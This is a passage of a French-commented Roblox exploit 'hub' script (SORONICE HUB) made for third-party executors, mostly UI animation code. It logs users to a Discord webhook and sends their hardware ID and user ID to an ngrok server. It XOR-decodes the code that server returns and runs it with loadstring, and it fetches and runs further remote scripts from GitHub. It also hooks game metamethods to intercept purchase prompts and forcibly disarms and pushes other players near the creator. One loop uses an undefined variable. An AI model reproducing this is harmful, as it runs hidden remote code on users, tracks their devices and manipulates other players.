			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
		end)
	end
	
	
	-- ==========================================
	-- 3. GESTION VIP (MULTIVERSE SÉCURISÉ)
	-- ==========================================
	local function checkVIPStatus()
		local url = API_URL .. "?id=" .. tostring(LocalPlayer.UserId)
		if httpRequest then
			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
			if success and response and response.Body then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response.Body) end)
				if decodeSuccess then return decodedData end
			end
		else
			local success, result = pcall(function() return game:HttpGet(url) end)
			if success then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(result) end)
				if decodeSuccess then return decodedData end
			end
		end
		return nil
	end
	
	local function handleVIP()
		local data = checkVIPStatus()
		if data and (data.action == "allow" or data.status == "active") then
			gui.Enabled = false
			_G.IsVipActive = true
	
			if not webhookSent then sendDiscordLog(true) end
	
			if not isHubLoaded then
				isHubLoaded = true
	
				-- === CONNEXION AU SERVEUR MULTIVERSE ===
				if httpRequest then
					local multiverseData = {
						place_id = tostring(game.PlaceId),
						hwid = hwid,
						userid = tostring(LocalPlayer.UserId)
					}
	
					local successReq, req = pcall(function()
						return httpRequest({
							Url = NGROK_MULTIVERSE,
							Method = "POST",
							Headers = {
								["Content-Type"] = "application/json",
								["ngrok-skip-browser-warning"] = "true"
							},
							Body = HttpService:JSONEncode(multiverseData)
						})
					end)
	
					if successReq and req and req.StatusCode == 200 then
						local successDecode, d = pcall(function() return HttpService:JSONDecode(req.Body) end)
						if successDecode and d.succes and d.code then
							-- DÉCODAGE XOR 90 DU CODE MULTIVERSE
							local tableau_nombres = d.code
							local caracteres = {}
							for i = 1, #tableau_nombres do
								caracteres[i] = string.char(bit32.bxor(tableau_nombres[i], 90))
							end
	
							local code_final = table.concat(caracteres)
							local executer, erreur = loadstring(code_final)
	
							if executer then
								executer()
							else
								warn("Erreur d'exécution Multiverse : " .. tostring(erreur))
							end
						end
					else
						warn("Multiverse : Impossible de contacter le serveur Python.")
					end
				else
					warn("Exécuteur non compatible pour contacter le Multiverse.")
				end
			end
	
			if not kickTimerStarted then
				kickTimerStarted = true
				local remainingMs = data.remainingMs or (4 * 60 * 60 * 1000)
				task.spawn(function()
					task.wait(remainingMs / 1000)
					LocalPlayer:Kick("Tes 4 heures de VIP sont terminées.")
				end)
			end
		else
			gui.Enabled = true 
			if not webhookSent then sendDiscordLog(false) end
			if _G.IsVipActive then LocalPlayer:Kick("Ton accès VIP vient d'expirer !") end
			_G.IsVipActive = false
		end
	end
	
	task.spawn(function()
		handleVIP()
		while true do
			if not _G.IsVipActive then task.wait(5) else task.wait(60) end
			pcall(handleVIP)
		end
	end)
	
	-- ==========================================
	-- 4. PROTECTION CRÉATEUR & BLOCAGE DES DONS
	-- ==========================================
	if LocalPlayer.UserId ~= ID_CREATEUR then
	
		-- 4A. BLOCAGE DES DONS (Pls Donate)
		local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			local method = getnamecallmethod()
			local args = {...}
	
			if not checkcaller() and self == MarketplaceService and (method == "PromptPurchase" or method == "PromptGamePassPurchase" or method == "PromptProductPurchase") then
				local itemId = args[2]
	
				task.spawn(function()
					local success, info = pcall(function() return MarketplaceService:GetProductInfo(itemId) end)
					if success and info then
						local targetId = (info.Creator and info.Creator.CreatorTargetId) or 0
						if targetId ~= ID_CREATEUR then
							pcall(function()
								StarterGui:SetCore("SendNotification", { Title = "SORONICE", Text = "Vous ne pouvez faire des dons qu'au créateur du script !", Duration = 5 })
							end)
						end
					end
				end)
			end
			return oldNamecall(self, ...)
		end))
	
		-- 4B. MODE INTOUCHABLE (Forcefield + Anti-Aim)
		local mouse = LocalPlayer:GetMouse()
		RunService.RenderStepped:Connect(function()
			local creatorPlayer = nil
			for _, p in ipairs(Players:GetPlayers()) do
				if p.UserId == ID_CREATEUR then
					creatorPlayer = p
					break
				end
			end
	
			if creatorPlayer and creatorPlayer.Character and creatorPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local myChar = LocalPlayer.Character
				local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
	
				if myRoot then
					local creatorRoot = creatorPlayer.Character.HumanoidRootPart
					local distance = (myRoot.Position - creatorRoot.Position).Magnitude
					local humanoid = myChar:FindFirstChild("Humanoid")
	
					-- 1. Barrière de 20 studs
					if distance < 20 then
						local pushDirection = (myRoot.Position - creatorRoot.Position).Unit
						myRoot.CFrame = myRoot.CFrame + (pushDirection * 1.5)
						if humanoid then humanoid:UnequipTools() end
					end
	
					-- 2. Anti-Aim (Désarme si on te vise)
					if mouse.Target and mouse.Target:IsDescendantOf(creatorPlayer.Character) then
						if humanoid then humanoid:UnequipTools() end
					end
				end
			end
		end)
	end
	
	
end
coroutine.wrap(FMQXZ_fake_script)()

local function QKIZU_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[2]

	local TweenService = game:GetService("TweenService")
	
	-- On récupère la frame (on part du principe que le script est dedans)
	local frame = script.Parent
	
	-- CONFIGURATION
	-- On stocke la taille originale que tu as définie dans l'UI
	local tailleOriginale = frame.Size
	-- Durée de l'animation (0.5 secondes pour que ce soit fluide)
	local duree = 0.5 
	
	-- Paramètres de l'animation avec l'effet de rebondissement (Elastic ou Back)
	-- "Back" est parfait pour l'effet "télé qui s'allume" avec un petit ressort à la fin
	local tweenInfo = TweenInfo.new(
		duree,                          -- Temps
		Enum.EasingStyle.Back,          -- Style : Back donne cet effet de dépassement/rebond
		Enum.EasingDirection.Out,       -- Direction : Appliquer l'effet à la fin du mouvement
		0,                              -- Répétitions
		false,                          -- Pas de reverse
		0                               -- Pas de délai
	)
	
	-- Initialisation de la Frame
	-- On la rend invisible et minuscule au départ
	frame.Size = UDim2.new(0, 0, 0, 0)
	frame.Visible = true
	
	-- Création de l'animation vers la taille d'origine
	local animationApparition = TweenService:Create(frame, tweenInfo, {Size = tailleOriginale})
	
	-- Lancement de l'animation
	animationApparition:Play()
end
coroutine.wrap(QKIZU_fake_script)()

local function AJFDN_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[15]

	local button = script.Parent
	local gui = button:FindFirstAncestorOfClass("ScreenGui")
	local TweenService = game:GetService("TweenService")
	
	button.MouseButton1Click:Connect(function()
		if gui then
			local elements = gui:GetChildren() -- On récupère TOUT ce qui est dans le GUI
			local nombreElements = 0
			local termines = 0
	
			-- 1. On configure l'apparence de l'animation
			local infoSortie = TweenInfo.new(
				0.6, 
				Enum.EasingStyle.Back, 
				Enum.EasingDirection.In
			)
	
			for _, objet in pairs(elements) do
				-- On ne déplace que les choses visibles (Frame, Button, TextLabel, etc.)
				-- On ignore le script lui-même ou les dossiers
				if objet:IsA("GuiObject") then
					nombreElements = nombreElements + 1
	
					-- Calcul de la sortie à droite pour CET objet précis
					local positionSortie = UDim2.new(1.5, 0, objet.Position.Y.Scale, objet.Position.Y.Offset)
					local animation = TweenService:Create(objet, infoSortie, {Position = positionSortie})
	
					animation:Play()
	
					-- On compte quand chaque animation se termine
					animation.Completed:Connect(function()
						termines = termines + 1
						-- Une fois que le DERNIER objet a fini de bouger, on supprime tout
						if termines >= nombreElements then
							gui:Destroy()
						end
					end)
				end
			end
	
			-- Sécurité : Si le GUI est vide ou n'a pas d'objets animables
			if nombreElements == 0 then
				gui:Destroy()
			end
		end
	end)
	-----------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1 -- Taille normale (100%)
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.10, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(1.00, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.10, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(AJFDN_fake_script)()

local function XALTC_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[Animation]]
	script.Parent = _i[18]

	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(XALTC_fake_script)()

local function HIKGQ_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[Copy]]
	script.Parent = _i[18]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://v0-roblox-account-integration.vercel.app"
		
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
end
coroutine.wrap(HIKGQ_fake_script)()

local function STAAA_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[police d'écriture]]
	script.Parent = _i[19]

	-- On récupère le TextLabel
	local textLabel = script.Parent
	
	-- On applique la police "Merriweather" en utilisant le nouveau système de Roblox (Font.fromName)
	textLabel.FontFace = Font.fromName("Merriweather")
	
	-- Optionnel : Si tu veux aussi l'avoir en Gras (Bold) ou en Italique par script, tu peux faire ça :
	-- textLabel.FontFace = Font.fromName("Merriweather", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
end
coroutine.wrap(STAAA_fake_script)()

local function ECMYD_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[26]

	local Players = game:GetService("Players")
	
	-- On récupère le joueur local (celui qui regarde son écran)
	local joueur = Players.LocalPlayer
	local imageLabel = script.Parent -- Ton ImageLabel
	
	-- On définit ce qu'on veut : juste la tête, en bonne qualité
	local typeImage = Enum.ThumbnailType.HeadShot
	local tailleImage = Enum.ThumbnailSize.Size420x420
	
	-- On demande à Roblox de récupérer le lien de l'image
	local imageURL, isReady = Players:GetUserThumbnailAsync(joueur.UserId, typeImage, tailleImage)
	
	-- Si l'image est prête et valide, on l'applique !
	if isReady then
		imageLabel.Image = imageURL
	else
		warn("Oups, impossible de charger la tête de " .. joueur.Name)
	end
end
coroutine.wrap(ECMYD_fake_script)()

local function SAUTS_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[29]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		local success, err = pcall(function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Audinay/code/refs/heads/main/README/Kdjfjfjfjfjfjr/Brjfjfbfjrjrfjrjrri/Hfhjfbfj.mml'))()		
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(SAUTS_fake_script)()

local function FDGZH_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[33]

	local LocalizationService = game:GetService("LocalizationService")
	local Players = game:GetService("Players")
	
	local textLabel = script.Parent
	local player = Players.LocalPlayer
	
	-- On récupère le code de langue du joueur (ex: "fr-fr", "en-us", "es-es")
	local locale = LocalizationService.RobloxLocaleId
	
	-- Table de traduction professionnelle
	local translations = {
		["fr"] = "Veuillez cliquer sur ce bouton pour accéder au site qui vous permettra de le déverrouiller.",
		["en"] = "Please click this button to access the site that will allow you to unlock it. ",
	}
	
	-- Fonction pour extraire le préfixe (ex: transforme "fr-fr" en "fr")
	local function getLanguagePrefix(localeId)
		return string.sub(localeId, 1, 2)
	end
	
	local langCode = getLanguagePrefix(locale)
	
	-- On applique la traduction correspondante, sinon on met de l'anglais par défaut
	if translations[langCode] then
		textLabel.Text = translations[langCode]
	else
		textLabel.Text = translations["en"] -- Langue par défaut si pays non listé
	end
end
coroutine.wrap(FDGZH_fake_script)()

local function EKROU_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[35]

	
	-----------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1 -- Taille normale (100%)
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.10, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(1.00, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.10, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(EKROU_fake_script)()

local function BKCJU_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[44]

	
end
coroutine.wrap(BKCJU_fake_script)()

local function GFCVZ_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[53]

	-- On récupère le service qui gère les entrées du joueur (Clavier, Souris, Tactile)
	local UserInputService = game:GetService("UserInputService")
	
	-- On définit les variables pour les éléments de ton interface graphique
	local imageLabelDeLInterface = script.Parent
	local texteDeLInterface = imageLabelDeLInterface:WaitForChild("pomlk1")
	
	-- On définit les variables pour tes IDs d'images exactes
	local imagePourLePC = "rbxassetid://121198413774602"
	local imagePourLeTelephone = "rbxassetid://107807340871451"
	
	-- On crée une fonction bien détaillée pour détecter l'appareil
	local function DetecterAppareilDuJoueur()
	
		-- On vérifie si l'appareil possède un écran tactile
		local possedeEcranTactile = UserInputService.TouchEnabled
	
		-- On vérifie si l'appareil possède un clavier physique connecté
		local possedeClavier = UserInputService.KeyboardEnabled
	
		-- On vérifie si l'appareil possède une souris connectée
		local possedeSouris = UserInputService.MouseEnabled
	
		-- On fait la condition pour savoir si c'est un téléphone
		-- Un téléphone a un écran tactile mais n'a pas de clavier physique intégré
		if possedeEcranTactile == true and possedeClavier == false then
	
			return "Telephone"
	
			-- Si ce n'est pas un téléphone, on considère que c'est un PC
		else
	
			return "PC"
	
		end
	
	end
	
	-- On crée une fonction pour appliquer l'image et le texte selon l'appareil détecté
	local function ActualiserLInterfaceGraphique()
	
		-- On appelle notre fonction de détection
		local appareilDetecte = DetecterAppareilDuJoueur()
	
		-- Si l'appareil détecté est un téléphone
		if appareilDetecte == "Telephone" then
	
			-- On met l'image du téléphone
			imageLabelDeLInterface.Image = imagePourLeTelephone
	
			-- On change le texte pour écrire téléphone
			texteDeLInterface.Text = "Téléphone"
	
			-- Si l'appareil détecté est un PC
		elseif appareilDetecte == "PC" then
	
			-- On met l'image du PC
			imageLabelDeLInterface.Image = imagePourLePC
	
			-- On change le texte pour écrire PC
			texteDeLInterface.Text = "PC"
	
		end
	
	end
	
	-- On lance la fonction finale une fois que le script est chargé
	ActualiserLInterfaceGraphique()
end
coroutine.wrap(GFCVZ_fake_script)()

local function ZMMMU_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[56]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://discord.gg/H9Umk4SvP"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(ZMMMU_fake_script)()

local function YUGEO_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[56]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "SORONICE HUB"
			getgenv().Message = "You copied the Discord link"
			getgenv().Temps = 3
			getgenv().LD = 4 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
end
coroutine.wrap(YUGEO_fake_script)()

local function YOQCI_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[58]

	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)-- C'est l'effet quand on passe la souris sur le bouton
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)-- C'est l'effet quand on appuie sur le bouton
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(YOQCI_fake_script)()

local function BGRKI_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[58]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "Youtube copied"
			getgenv().Message = "You copied the Youtube link"
			getgenv().Temps = 3
			getgenv().LD = 3 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
	A = 10000 
	wait(2)
	A = A + 1
	local A = 10000 -- Ton point de départ
	
	while a < 10050 do -- Ici, 10050 est ton point de terminaison
		task.wait(2) -- Utilise task.wait() pour de meilleures performances sur Roblox
		a = a + 1
		print("La valeur actuelle est : " .. a)
	end
	
	-- Ton code suivant se place ici, il ne s'exécutera qu'une fois la boucle finie
	print("La boucle est terminée, je passe à la suite.")
end
coroutine.wrap(BGRKI_fake_script)()

local function EJZSC_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[60]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://www.youtube.com/@SORONICEv"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(EJZSC_fake_script)()

local function VJJZY_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[60]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "SORONICE HUB"
			getgenv().Message = "You copied the Youtube link"
			getgenv().Temps = 3
			getgenv().LD = 3 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
end
coroutine.wrap(VJJZY_fake_script)()

local function TIUEZ_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[62]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://www.youtube.com/@SORONICEv"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
